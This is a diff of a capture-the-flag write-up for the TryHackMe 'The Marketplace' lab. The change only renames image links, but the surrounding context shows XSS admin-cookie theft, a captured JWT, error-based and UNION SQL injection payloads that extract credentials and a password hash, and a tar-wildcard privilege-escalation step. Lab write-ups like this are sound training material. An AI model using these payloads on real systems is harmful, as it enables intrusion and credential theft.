@@ -69,67 +69,67 @@ Always enumerate HTTP first, as it has the largest attack vectors.
 
 In the `index` page, we can see there are 2 users: `michael` and `jake`.
 
-![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/The_Marketplace/images/a1.png)
+![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/The-Marketplace/images/a1.png)
 
 And we also see that there is a login page! Let's test SQL Injection to bypass authentication!
 
-![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/The_Marketplace/images/a2.png)
+![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/The-Marketplace/images/a2.png)
 
-![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/The_Marketplace/images/a3.png)
+![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/The-Marketplace/images/a3.png)
 
 Nope. Looks like it's not vulnerable to SQL Injection.
 
 Then why don't we register a new user? Maybe there is a vulnerablility waiting for us!
 
-![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/The_Marketplace/images/a4.png)
+![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/The-Marketplace/images/a4.png)
 
 Let's login into the newly created account!
 
-![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/The_Marketplace/images/a5.png)
+![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/The-Marketplace/images/a5.png)
 
-![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/The_Marketplace/images/a6.png)
+![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/The-Marketplace/images/a6.png)
 
 We can see that there are 2 things that's worth to investigate: `New listing` and `Messages`.
 
-![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/The_Marketplace/images/a7.png)
+![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/The-Marketplace/images/a7.png)
 
 Hmm... File upload's temporarily disabled, so we can't upload a PHP reverse shell.
 
 Let's test the "Submit Query".
 
-![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/The_Marketplace/images/a8.png)
+![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/The-Marketplace/images/a8.png)
 
-![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/The_Marketplace/images/a9.png)
+![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/The-Marketplace/images/a9.png)
 
 A new item is created!
 
-![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/The_Marketplace/images/a10.png)
+![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/The-Marketplace/images/a10.png)
 
 Let's test **Cross-site Script(XSS)**!
 
-![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/The_Marketplace/images/a11.png)
+![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/The-Marketplace/images/a11.png)
 
-![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/The_Marketplace/images/a12.png)
+![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/The-Marketplace/images/a12.png)
 
 Looks like the "Title" is not vulnerable to XSS.
 
 BUT!
 
-![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/The_Marketplace/images/a13.png)
+![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/The-Marketplace/images/a13.png)
 
 The "Description" is vulnerable to XSS! Also, if you see it carefully, there is a link to "Contact the listing author". Let's check that out!
 
-![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/The_Marketplace/images/a14.png)
+![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/The-Marketplace/images/a14.png)
 
-![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/The_Marketplace/images/a15.png)
+![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/The-Marketplace/images/a15.png)
 
 It seems like we can send a message to the item's author! Let's test XSS again!
 
-![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/The_Marketplace/images/a16.png)
+![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/The-Marketplace/images/a16.png)
 
-![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/The_Marketplace/images/a17.png)
+![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/The-Marketplace/images/a17.png)
 
-![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/The_Marketplace/images/a18.png)
+![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/The-Marketplace/images/a18.png)
 
 Nope, it's not vulnerable to XSS.
 
@@ -137,11 +137,11 @@ Hmm... What if we can capture a user's cookie? So we can login as that user?
 
 I also notice that we can report a listing to **admin**!
 
-![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/The_Marketplace/images/a19.png)
+![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/The-Marketplace/images/a19.png)
 
-![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/The_Marketplace/images/a20.png)
+![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/The-Marketplace/images/a20.png)
 
-![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/The_Marketplace/images/a21.png)
+![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/The-Marketplace/images/a21.png)
 
 Hmm... What if we can leverage the XSS vunlerability to capture admin's "token" cookie?? This would allow us to login as admin!
 
@@ -149,7 +149,7 @@ Hmm... What if we can leverage the XSS vunlerability to capture admin's "token" 
 
 1. host a website via python's `http.server` module:
 
-![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/The_Marketplace/images/a22.png)
+![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/The-Marketplace/images/a22.png)
 
 2. Craft a XSS payload:
 
@@ -162,23 +162,23 @@ This will create an image in the listing, and capture an user's cookies.
 
 3. Create a new listing with the XSS payload in above:
 
-![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/The_Marketplace/images/a23.png)
+![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/The-Marketplace/images/a23.png)
 
 After created, you should see your cookies:
 
-![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/The_Marketplace/images/a24.png)
+![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/The-Marketplace/images/a24.png)
 
 4. Click "Report listing to admins":
 
-![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/The_Marketplace/images/a25.png)
+![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/The-Marketplace/images/a25.png)
 
-![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/The_Marketplace/images/a26.png)
+![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/The-Marketplace/images/a26.png)
 
 5. Captured admin's cookies!:
 
-![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/The_Marketplace/images/a27.png)
+![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/The-Marketplace/images/a27.png)
 
-![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/The_Marketplace/images/a28.png)
+![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/The-Marketplace/images/a28.png)
 
 ```
 token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjIsInVzZXJuYW1lIjoibWljaGFlbCIsImFkbWluIjp0cnVlLCJpYXQiOjE2NjE4NTAxMDJ9.CghyCdJOW-5TqjD2vkqPMZzuxOE5CQnS0dSvnLvQPxQ
@@ -186,15 +186,15 @@ token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjIsInVzZXJuYW1lIjoibWlja
 
 6. Change your token value to admin's value:
 
-![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/The_Marketplace/images/a29.png)
+![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/The-Marketplace/images/a29.png)
 
 7. Hard refresh(Ctrl+r) your browser:
 
-![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/The_Marketplace/images/a30.png)
+![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/The-Marketplace/images/a30.png)
 
 Boom!! We're admin!
 
-![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/The_Marketplace/images/a31.png)
+![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/The-Marketplace/images/a31.png)
 
 **flag 1:**
 ```
@@ -205,11 +205,11 @@ THM{Redacted}
 
 After I enumerate the "Administration panel" a little bit, I found that **it suffers SQL Injection**!
 
-![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/The_Marketplace/images/a32.png)
+![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/The-Marketplace/images/a32.png)
 
-![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/The_Marketplace/images/a33.png)
+![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/The-Marketplace/images/a33.png)
 
-![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/The_Marketplace/images/a34.png)
+![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/The-Marketplace/images/a34.png)
 
 Found an **Error-Based SQL Injection** vulnerability! I'll use [this cheat sheet](https://perspectiverisk.com/mysql-sql-injection-practical-cheat-sheet/) to do it.
 
@@ -218,7 +218,7 @@ Found an **Error-Based SQL Injection** vulnerability! I'll use [this cheat sheet
 1 AND extractvalue(rand(),concat(0x3a,version()))--
 ```
 
-![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/The_Marketplace/images/a35.png)
+![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/The-Marketplace/images/a35.png)
 
 - MySQL version:8.0.21
 
@@ -228,9 +228,9 @@ Found an **Error-Based SQL Injection** vulnerability! I'll use [this cheat sheet
 1 AND extractvalue(rand(),concat(0x3a,(SELECT concat(0x3a,schema_name) FROM information_schema.schemata LIMIT 1,1)))--
 ```
 
-![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/The_Marketplace/images/a36.png)
+![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/The-Marketplace/images/a36.png)
 
-![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/The_Marketplace/images/a37.png)
+![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/The-Marketplace/images/a37.png)
 
 - Databases: `information_schema`, `marketplace`.
 
@@ -243,11 +243,11 @@ Since `information_schema` is a default database in MySQL, I'll enumerate the `m
 1 AND extractvalue(rand(),concat(0x3a,(SELECT concat(0x3a,TABLE_NAME) FROM information_schema.TABLES WHERE table_schema="marketplace" LIMIT 2,1)))--
 ```
 
-![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/The_Marketplace/images/a38.png)
+![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/The-Marketplace/images/a38.png)
 
-![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/The_Marketplace/images/a39.png)
+![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/The-Marketplace/images/a39.png)
 
-![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/The_Marketplace/images/a40.png)
+![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/The-Marketplace/images/a40.png)
 
 - Database `marketplace`'s table names: `items`, `messages`, `users`.
 
@@ -271,13 +271,13 @@ Since `information_schema` is a default database in MySQL, I'll enumerate the `m
 1 AND extractvalue(rand(),concat(0x3a,(SELECT concat(0x3a,column_name) FROM information_schema.COLUMNS WHERE TABLE_NAME="users" LIMIT 3,1)))--
 ```
 
-![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/The_Marketplace/images/a41.png)
+![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/The-Marketplace/images/a41.png)
 
-![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/The_Marketplace/images/a42.png)
+![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/The-Marketplace/images/a42.png)
 
-![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/The_Marketplace/images/a43.png)
+![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/The-Marketplace/images/a43.png)
 
-![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/The_Marketplace/images/a44.png)
+![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/The-Marketplace/images/a44.png)
 
 - Database `marketplace`'s column names: 
 	- Table `items`: `id`, `author`, `title`, `description`, `image`.
@@ -297,11 +297,11 @@ Since `information_schema` is a default database in MySQL, I'll enumerate the `m
 1 AND extractvalue(rand(),concat(0x3a,(SELECT concat(id,0x3a,author,0x3a,title,0x3a,description,0x3a,image) FROM items LIMIT 1,1)))--
 ```
 
-![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/The_Marketplace/images/a45.png)
+![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/The-Marketplace/images/a45.png)
 
-![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/The_Marketplace/images/a46.png)
+![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/The-Marketplace/images/a46.png)
 
-![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/The_Marketplace/images/a47.png)
+![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/The-Marketplace/images/a47.png)
 
 **Credentials from table `users`:**
 ```
@@ -328,9 +328,9 @@ To fix this, we have to change our payload.
 
 I found that we can also use **UNION**.
 
-![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/The_Marketplace/images/a48.png)
+![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/The-Marketplace/images/a48.png)
 
-![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/The_Marketplace/images/a49.png)
+![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/The-Marketplace/images/a49.png)
 
 **Let's use UNION to retrieve all data from tables `users` and `messages` !**
 ```sql
@@ -341,9 +341,9 @@ I found that we can also use **UNION**.
 0 UNION ALL SELECT concat(user_to,0x3a,message_content),NULL,NULL,NULL FROM messages LIMIT 0,1--
 ```
 
-![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/The_Marketplace/images/a50.png)
+![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/The-Marketplace/images/a50.png)
 
-![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/The_Marketplace/images/a51.png)
+![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/The-Marketplace/images/a51.png)
 
 **Full credentials:**
 ```
@@ -359,11 +359,11 @@ jake:$2b$10$/DkSlJB4L85SCNhS.IxcfeNpEBn.VkyLvQ2Tk9p2SDsiVcCRb4ukG
 
 Also, we know `id:3` is user `jake` from "Administration panel".
 
-![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/The_Marketplace/images/a52.png)
+![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/The-Marketplace/images/a52.png)
 
 Now, let's login to user `jake` via SSH!
 
-![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/The_Marketplace/images/a53.png)
+![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/The-Marketplace/images/a53.png)
 
 We're finally in!
 
@@ -405,7 +405,7 @@ tar cf /opt/backups/backup.tar *
 
 According to [GTFOBins](https://gtfobins.github.io/gtfobins/tar/), we can spawn a interactive shell via abusing the wildcard!
 
-![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/The_Marketplace/images/a54.png)
+![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/The-Marketplace/images/a54.png)
 
 1. Create a python reverse shell:
 
